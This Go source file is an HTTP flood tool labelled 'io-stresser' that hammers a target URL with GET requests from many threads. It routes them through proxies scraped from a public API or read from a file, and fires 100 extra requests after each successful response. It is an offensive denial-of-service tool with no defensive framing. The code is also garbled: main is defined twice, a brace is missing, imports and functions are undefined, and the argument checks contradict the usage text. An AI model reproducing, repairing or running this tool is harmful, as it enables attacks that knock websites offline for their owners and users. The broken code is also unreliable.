package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

var (
	proxies       []string
	proxiesMutex  sync.Mutex
	threads       int
	target        string
	times         int
	bypass        bool
	fakeUa        string
)

func main() {
	if len(os.Args) != 6 {
		fmt.Println("Usage: go run io-stresser.go <URL> <TIME> <THREADS> <bypass/proxy/proxy.txt>")
		os.Exit(0)
	} else {
		target = os.Args[1]
		times = parseArgToInt(os.Args[2])
		threads = parseArgToInt(os.Args[3])

		if os.Args[4] == "bypass" {
			fmt.Println("ATTACK BYPASS")
			bypass = true
		} else if os.Args[4] == "proxy" {
			fmt.Println("ATTACK HTTP_PROXY")
			loadProxies()
		} else {
			fmt.Println("ATTACK HTTP_PROXY")
			loadProxiesFromFile()
		}

		for i := 0; i < threads; i++ {
			go thread(i + 1)
		}

		time.Sleep(time.Duration(times) * time.Second)
		fmt.Println("Attack End")
		os.Exit(0)
	}
}

func thread(threadNum int) {
	for {
		if !bypass {
			proxy := getRandomProxy()
			proxyURL := "http://" + proxy
			client := &http.Client{
				Transport: &http.Transport{
					Proxy: http.ProxyURL(proxyURL),
				},
			}
			req, err := http.NewRequest("GET", target, nil)
			if err != nil {
				continue
			}
			req.Header.Set("Cache-Control", "no-cache")
			req.Header.Set("User-Agent", fakeUa)

			resp, err := client.Do(req)
			if err != nil {
				fmt.Println("Error:", err)
				continue
			}
			defer resp.Body.Close()

			fmt.Println(resp.StatusCode, "HTTP_PROXY")
			if resp.StatusCode >= 200 && resp.StatusCode <= 226 {
				for i := 0; i < 100; i++ {
					go client.Do(req)
				}
			} else {
				removeProxy(proxy)
			}
		} else {
			resp, err := http.Get(target)
			if err != nil {
				fmt.Println("Error:", err)
				continue
			}
			defer resp.Body.Close()

			fmt.Println(resp.StatusCode, "HTTP_RAW")
		}
	}
}

func getRandomProxy() string {
	proxiesMutex.Lock()
	defer proxiesMutex.Unlock()
	if len(proxies) == 0 {
		return ""
	}
	rand.Seed(time.Now().UnixNano())
	index := rand.Intn(len(proxies))
	proxy := proxies[index]
	return proxy
}

func removeProxy(proxy string) {
	proxiesMutex.Lock()
	defer proxiesMutex.Unlock()
	for i, p := range proxies {
		if p == proxy {
			proxies = append(proxies[:i], proxies[i+1:]...)
			break
		}
	}
}

func loadProxies() {
	resp, err := http.Get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all")
	if err != nil {
		fmt.Println("Error:", err)
		os.Exit(1)
		
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error:", err)
		os.Exit(1)
	}

	proxiesMutex.Lock()
	defer proxiesMutex.Unlock()
	proxies = strings.Split(string(body), "\n")
}

func loadProxiesFromFile() {
	filePath := os.Args[4]
	file, err := os.Open(filePath)
	if err != nil {
		fmt.Println("Error:", err)
		os.Exit(1)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxiesMutex.Lock()
		proxies = append(proxies, scanner.Text())
		proxiesMutex.Unlock()
	}

	if scanner.Err() != nil {
		fmt.Println("Error:", scanner.Err())
		os.Exit(1)
	}
}

func parseArgToInt(arg string) int {
	value, err := strconv.Atoi(arg)
	if err != nil {
		fmt.Println("Error:", err)
		os.Exit(1)
	}
	return value
}

func run() {
	if len(os.Args) != 6 {
		fmt.Println("Usage: go run io-stresser.go <URL> <TIME> <THREADS> <bypass/proxy/proxy.txt>")
		os.Exit(0)
	}

	target := os.Args[1]
	times := parseArgToInt(os.Args[2])
	threads := parseArgToInt(os.Args[3])
	attackType := os.Args[5]

	switch attackType {
	case "bypass":
		fmt.Println("ATTACK BYPASS")
	case "proxy":
		fmt.Println("ATTACK HTTP_PROXY")
		loadProxies()
	default:
		fmt.Println("ATTACK HTTP_PROXY")
		loadProxiesFromFile()
	}

	for i := 0; i < threads; i++ {
		go func() {
			for {
				if attackType != "bypass" {
					proxy := getRandomProxy()
					proxyURL, err := url.Parse("http://" + proxy)
					if err != nil {
						fmt.Println("Error:", err)
						continue
					}

					transport := &http.Transport{
						Proxy: http.ProxyURL(proxyURL),
					}

					client := &http.Client{
						Transport: transport,
					}

					request, err := http.NewRequest("GET", target, nil)
					if err != nil {
						fmt.Println("Error:", err)
						continue
					}

					request.Header.Set("Cache-Control", "no-cache")
					request.Header.Set("User-Agent", fakeUa.UserAgent())

					response, err := client.Do(request)
					if err != nil {
						fmt.Println("Error:", err)
						continue
					}

					fmt.Println(response.StatusCode, "HTTP_PROXY")

					if response.StatusCode >= 200 && response.StatusCode <= 226 {
						for index := 0; index < 100; index++ {
							go func() {
								_, err := client.Do(request)
								if err != nil {
									fmt.Println("Error:", err)
								}
							}()
						}
					} else {
						removeProxy(proxy)
					}
				} else {
					response, err := http.Get(target)
					if err != nil {
						fmt.Println("Error:", err)
						continue
					}
					fmt.Println(response.StatusCode, "HTTP_RAW")
				}
			}
		}()
	}

	time.Sleep(time.Duration(times) * time.Second)
	fmt.Println("Attack End")
	os.Exit(0)
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU())

	mainProcess()
}
